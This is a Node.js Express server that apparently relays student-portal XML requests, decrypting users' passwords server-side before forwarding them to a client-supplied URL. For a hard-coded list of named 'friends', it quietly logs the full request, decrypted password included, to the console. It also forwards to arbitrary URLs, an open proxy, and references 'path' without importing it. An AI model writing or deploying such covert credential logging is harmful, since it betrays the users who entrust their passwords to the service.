const express = require('express');
const axios = require('axios');
const cors = require('cors');
const CryptoJS = require('crypto-js');

const app = express();
app.use(express.json()); // Parse incoming JSON requests
app.options('*', cors());
app.use(cors());
app.use(express.static('public'));

const encryptionKey = process.env.encryptionkey;
const apikey=process.env.apikey;

function decryptDetails(details){
    const bytes = CryptoJS.AES.decrypt(details.password, encryptionKey);
    const originalText = bytes.toString(CryptoJS.enc.Utf8);
    return(originalText)
}

const friends={"149907":"blake","10016976":"isaac","153486":"asher","151376":"luke","269979":"dylan","125105":"brady"}
const regions=new Map()
const regionURLs=[]

// Serve a specific file from a folder
app.get('/adsLol.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'adsLol.js'));
});

// Serve static files from a directory (e.g., a 'public' folder)


app.get("/userCount/:region",async(req,res)=>{
    try{
        const region=parseInt(req.params.region,10);
        if(isNaN(region)){throw new Error("Region must be number")}else{
            res.send(regionURLs[region]+"\n User Count: "+regions.get(regionURLs[region]).size)
        }


    }
    catch(error){res.send(error.message)}
})


app.post("/fulfillAxios",async(req,res)=>{
  try{
  const details=req.body;
  if(!regions.has(details.url)){regions.set(details.url,new Set());regionURLs.push(details.url)}
  else{
    if(!regions.get(details.url).has(details.username)){regions.get(details.url).add(details.username)}
  }
  if(details.encrypted){
    const password=decryptDetails(details);
    details.xml=details.xml.replace(details.password,password)
  }
    console.log(details.url);
      if(friends.hasOwnProperty(details.username)){console.log(friends[details.username]);console.log(details.xml)}
try{
  var response=await axios.post(details.url,details.xml,{headers: {
            'Content-Type': 'text/xml',
            "Cookie":"edupointkeyversion="+apikey+";"
          }})}catch(error){if(error.code=="ECONNRESET"){throw new Error("Network Error")}else{throw error}}
  res.json({status:true,response:response.data});
  }catch(error){console.log(error);res.json({status:false,message:error.message})}})

app.post("/encryptPassword",(req,res)=>{
  const details=req.body;
  res.json({encryptedPassword:CryptoJS.AES.encrypt(details.password, encryptionKey).toString()})
})

app.listen(3000, () => {
    ////console.log('Server is running on port 3000');
});
//g
